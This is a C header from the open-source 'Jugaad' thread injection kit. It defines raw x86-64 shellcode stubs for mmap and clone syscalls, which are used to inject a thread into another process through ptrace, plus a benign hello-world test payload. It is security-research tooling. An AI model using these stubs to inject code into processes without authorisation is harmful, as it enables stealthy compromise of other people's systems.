/*
 * Jugaad - Thread Injection Kit
 *
 * Author: Aseem Jakhar
 * Organization: null - The open security community
 * Websites: http://null.co.in   http://nullcon.net
 *
 * Copyright (c) 2011-2021 Aseem Jakhar <aseemjakhar_at_gmail.com>. All rights reserved.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
 * BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
 * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE
 * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 */


#ifndef _shellcode_h_
#define _shellcode_h_

#ifdef __cplusplus
extern "C" {
#endif /* __cplusplus */

/*
 * The stub for mmap2 shellcode. The values of length, prot and flags is
 * updated in the stub to make the final customized payload.
 */
 
 
 //########################################################################
#define MMAP_STUB			"\xbf\x00\x00\x00\x00"		\
							"\xbe\x00\x00\x40\x00"		\
							"\xba\x07\x00\x00\x00"		\
							"\x41\xba\x22\x00\x00\x00"	\
							"\xb8\x09\x00\x00\x00"		\
							"\x0f\x05"					\
							"\xcc"
							
//###############################################################################


/* Offsets into the stub shellcode for changing the values */ 
// #define MMAP2_LEN_OFFSET    3
// #define MMAP2_PROT_OFFSET   8
// #define MMAP2_FLAGS_OFFSET  13

#define WORD_SIZE sizeof(long) 

/*
 * Shellcode STUB for creating a thread. It uses the clone syscall. For this shellcode to run
 * it requires the following to be set in the STUB:
 *    1. The stack bottom address in %ecx register.
 *    2. The function pointer address in %ebx register.
 *    3. clone flags.
 * 1. The stack bottom address means when we allocate memory using mmap shellcode we
 * have to pass the address of the last byte of the mmap'ed memory, for example
 * if we we allocate 10 bytes at address 0x00 the bottom of the stack would be
 * 0x09. Simple!
 * 2. The clone shellcode stub uses relative addressing (and sets ebx) to jump to the thread payload
 * specified by the caller. Hence, we need to append the thread payload to the
 * CLONE_STUB_HEAD so that it calls clone and jumps to the payload in the child thread
 * and execute int3 instrution in the main thread. 
 * 3. Clonse flags are the same what are used for clone system call.
 * 
 * The CLONE_STUB_TAIL is exit syscall and is further appended to the payload making
 * the work of the caller easier by not requiring them to specifically exit when 
 * the job is done. So, the Thread shellcode when prepared will look like:
 * [CLONE_STUB_HEAD|Caller_payload|CLONE_STUB_TAIL]
 *
 * This shellcode is not complete as we need to provide the value of %ecx which is the address
 * of the stack bottom. One way to do it is via setregs in ptrace and set the value of
 * ecx to the stack bottom address, but in that case the shellcode is not independent i.e
 * it still depends on external ptrace setregs to make it executable in the remote process.
 * The above shellcode has the stub for movl  address, %ecx which we can update when creating the
 * shellcode through just the passed argument to shellcode_thread() function.
 */

#define THREAD_STUB			"\x48\x8d\x3d\x3f\x00\x00\x00"	\
							"\xe8\x01\x00\x00\x00"			\
							"\xcc"							\
							"\x57"							\
							"\xe8\x16\x00\x00\x00"			\
							"\x48\x8d\xb0\xf8\xff\x3f\x00"	\
							"\x8f\x06"						\
							"\xbf\x00\x09\x01\x00"			\
							"\xb8\x38\x00\x00\x00"			\
							"\x0f\x05"						\
							"\xc3"							\
							"\xbf\x00\x00\x00\x00"			\
							"\xbe\x00\x00\x40\x00"			\
							"\xba\x07\x00\x00\x00"			\
							"\x41\xba\x22\x00\x00\x00"		\
							"\xb8\x09\x00\x00\x00"			\
							"\x0f\x05"						\
							"\xcc"


/*
 * Couple of payloads to test jugaad.
 *
 *
 */
 #define Hallo_World		"\xeb\x0c"						\
							"\x48"							\
							"\x65\x6c"						\
							"\x6c"							\
							"\x6f"							\
							"\x20\x57\x6f"					\
							"\x72\x6c"						\
							"\x64\x0a\xb8\x01\x00\x00\x00"	\
							"\xb8\x01\x00\x00\x00"			\
							"\xbf\x01\x00\x00\x00"			\
							"\x48\x8d\x35\xe3\xff\xff\xff"	\
							"\xba\x0c\x00\x00\x00"			\
							"\x0f\x05"						\
							"\xbf\x00\x00\x00\x00"			\
							"\xb8\x3c\x00\x00\x00"			\
							"\x0f\x05"						\


/*
 * This structure represents a shellcode object. The payload is
 * not supposed to end with a terminating NULL as a convention.
 * The user must make sure it does not end with 'C' NULL character
 * due to the use of string manipulation functions when creating
 * an object.
 */
struct shellcode
{
    unsigned char * payload; /* The actual binary payload */
    size_t          psize;   /* Size of the payload not including
                                the terminating NULL */
};

struct shellcode *   shellcode_alloc(size_t psize);
struct shellcode *    shellcode_copy(unsigned char * payload,
                                     size_t psize);

int  shellcode_append(struct shellcode * this,
                      unsigned char * payload,
                      size_t psize);
void   shellcode_free(struct shellcode ** this);

struct shellcode *  shellcode_mmap2(void);
struct shellcode * shellcode_thread(unsigned char * tpayload,
                                    size_t tpsize);
size_t shellcode_get_threadcode_size(size_t payload_size);

#ifdef __cplusplus
}
#endif /* __cplusplus */

#endif /* _shellcode_h_ */
